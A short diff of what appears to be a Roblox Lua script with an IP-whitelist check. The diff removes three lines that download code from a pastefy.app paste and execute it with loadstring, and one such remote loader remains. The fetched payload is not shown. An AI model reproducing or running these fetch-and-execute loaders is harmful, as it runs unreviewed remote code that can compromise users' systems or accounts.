@@ -26,12 +26,6 @@ for v1,v2 in pairs(_G.Ipwhilelisted) do
         break
     end
 end
-
-loadstring(game:HttpGet("https://pastefy.app/MtsB3VJt/raw"))()
-print("Axionix")
-loadstring(game:HttpGet("https://pastefy.app/MtsB3VJt/raw"))()
-print("Axionix")
-loadstring(game:HttpGet("https://pastefy.app/MtsB3VJt/raw"))()
 print("Axionix")
 loadstring(game:HttpGet("https://pastefy.app/dwq6zCn1/raw"))()
 print("Axionix")
